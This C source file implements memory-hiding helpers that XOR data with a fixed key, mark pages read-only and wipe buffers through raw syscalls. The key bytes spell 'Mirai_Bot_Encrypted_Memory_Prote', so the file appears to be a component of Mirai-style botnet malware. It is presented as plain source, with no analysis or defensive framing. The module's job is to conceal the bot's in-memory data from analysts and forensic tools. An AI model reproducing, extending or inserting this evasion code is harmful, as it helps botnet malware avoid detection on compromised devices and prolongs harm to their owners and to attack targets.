#include "headers/memprotect.h"
#include "headers/syscalls.h"
#include "headers/libc.h"
#include "headers/util.h"

static uint8_t xor_key[32] = {
    0x4d, 0x69, 0x72, 0x61, 0x69, 0x5f, 0x42, 0x6f,
    0x74, 0x5f, 0x45, 0x6e, 0x63, 0x72, 0x79, 0x70,
    0x74, 0x65, 0x64, 0x5f, 0x4d, 0x65, 0x6d, 0x6f,
    0x72, 0x79, 0x5f, 0x50, 0x72, 0x6f, 0x74, 0x65
};

void mem_xor_encrypt(void *ptr, size_t len) {
    if (!ptr || len == 0) return;
    
    uint8_t *data = (uint8_t *)ptr;
    for (size_t i = 0; i < len; i++) {
        data[i] ^= xor_key[i % 32];
    }
}

void mem_xor_decrypt(void *ptr, size_t len) {
    mem_xor_encrypt(ptr, len);
}

int mem_protect_region(void *ptr, size_t len, int prot) {
    if (!ptr || len == 0) return -1;
    
    long page_size = 4096;
    
    uintptr_t start = (uintptr_t)ptr;
    uintptr_t end = start + len;
    uintptr_t page_start = start & ~(page_size - 1);
    uintptr_t page_end = (end + page_size - 1) & ~(page_size - 1);
    size_t page_len = page_end - page_start;
    
    return _syscall3(__NR_mprotect, (long)page_start, (long)page_len, (long)prot);
}

int mem_encrypt_and_protect(void *ptr, size_t len) {
    if (!ptr || len == 0) return -1;
    
    mem_xor_encrypt(ptr, len);
    return mem_protect_region(ptr, len, 1);
}

int mem_decrypt_and_unprotect(void *ptr, size_t len) {
    if (!ptr || len == 0) return -1;
    
    int ret = mem_protect_region(ptr, len, 3);
    if (ret == 0) {
        mem_xor_decrypt(ptr, len);
    }
    return ret;
}

void *mem_alloc_encrypted(size_t len) {
    if (len == 0) return NULL;
    
    long page_size = 4096;
    size_t total_len = (len + page_size - 1) & ~(page_size - 1);
    
#ifdef __NR_mmap2
    long p = _syscall6(__NR_mmap2, 0, (long)total_len, 3, SYS_MAP_PRIVATE | SYS_MAP_ANON, -1, 0);
#else
    long p = _syscall6(__NR_mmap, 0, (long)total_len, 3, SYS_MAP_PRIVATE | SYS_MAP_ANON, -1, 0);
#endif
    if (p < 0 && p > -4096) return NULL;
    void *ptr = (void *)p;
    
    mem_xor_encrypt(ptr, len);
    _syscall3(__NR_mprotect, (long)ptr, (long)total_len, 1);
    
    return ptr;
}

int mem_free_encrypted(void *ptr, size_t len) {
    if (!ptr || len == 0) return -1;
    
    long page_size = 4096;
    size_t total_len = (len + page_size - 1) & ~(page_size - 1);
    
    return _syscall2(__NR_munmap, (long)ptr, (long)total_len);
}

void mem_wipe(void *ptr, size_t len) {
    if (!ptr || len == 0) return;
    
    volatile uint8_t *p = (uint8_t *)ptr;
    for (size_t i = 0; i < len; i++) {
        p[i] = 0;
    }
    
    asm volatile("" ::: "memory");
}
